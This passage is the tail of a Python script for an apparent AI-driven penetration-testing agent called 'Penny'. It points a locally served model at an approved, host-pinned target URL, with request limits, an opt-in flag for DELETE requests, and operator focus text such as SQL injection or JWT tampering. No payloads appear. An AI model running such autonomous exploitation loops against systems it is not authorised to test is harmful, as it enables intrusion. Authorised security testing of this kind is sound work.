                       "for unknown paths, so none of these endpoints are real")
    norm = _norm_path(finding_path)
    if real_hits.get(norm):
        return True, ""
    # Allow an id-style finding (/api/x/{id}) backed by a real sibling (/api/x/123).
    parent = norm.rsplit("/", 1)[0]
    for probed, was_real in real_hits.items():
        if was_real and (probed == norm or probed.rsplit("/", 1)[0] == parent):
            return True, ""
    return False, (f"no real (non-baseline) response backs {finding_path}; its probes matched the "
                   "catch-all baseline, so the endpoint isn't proven to exist")


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description="Penny sandbox active-exploitation agent (runs on the box)")
    parser.add_argument("target", help="approved target root URL (host-pinned)")
    parser.add_argument("--endpoint", default=MODEL_ENDPOINT_DEFAULT, help="local vLLM OpenAI-compatible endpoint")
    parser.add_argument("--model", default="heretic", help="served model name (vLLM --served-model-name)")
    parser.add_argument("--max-requests", type=int, default=200)  # room for recon + deterministic probes + model loop
    parser.add_argument("--max-turns", type=int, default=24)
    parser.add_argument("--minutes", type=float, default=0.0, help="run the model loop for this many minutes (0 = use --max-turns)")
    parser.add_argument("--allow-destructive", action="store_true", help="permit DELETE (off by default)")
    # Operator focus for this run, base64-encoded (avoids shell-quoting arbitrary text). Appended
    # to the system prompt so you can steer WHAT it tests, e.g. "focus on SQLi in /search and
    # JWT tampering; ignore IDOR".
    parser.add_argument("--instructions-b64", default="", help="base64-encoded operator focus appended to the system prompt")
    # Deterministic probes (recon backend + rate-limit + injection + writes) run once; parallel
    # workers after the first pass --no-deterministic so they only add model-driven coverage.
    parser.add_argument("--no-deterministic", action="store_true", help="skip the deterministic probe suite (model loop only)")
    args = parser.parse_args(argv)
    system = SYSTEM_PROMPT
    if args.instructions_b64:
        import base64
        focus = base64.b64decode(args.instructions_b64).decode("utf-8", "replace").strip()
        if focus:
            system = SYSTEM_PROMPT + "\n\nOPERATOR FOCUS FOR THIS RUN (prioritize this over the generic list above):\n" + focus
    try:
        gate = RemoteGate(args.target, max_requests=args.max_requests, allow_destructive=args.allow_destructive)
    except GateError as error:
        emit({"event": "fatal", "msg": str(error)})
        return 2
    run_loop(gate, args.endpoint, args.model, max_turns=args.max_turns, system=system,
             deterministic=not args.no_deterministic,
             max_seconds=(args.minutes * 60 if args.minutes and args.minutes > 0 else None))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
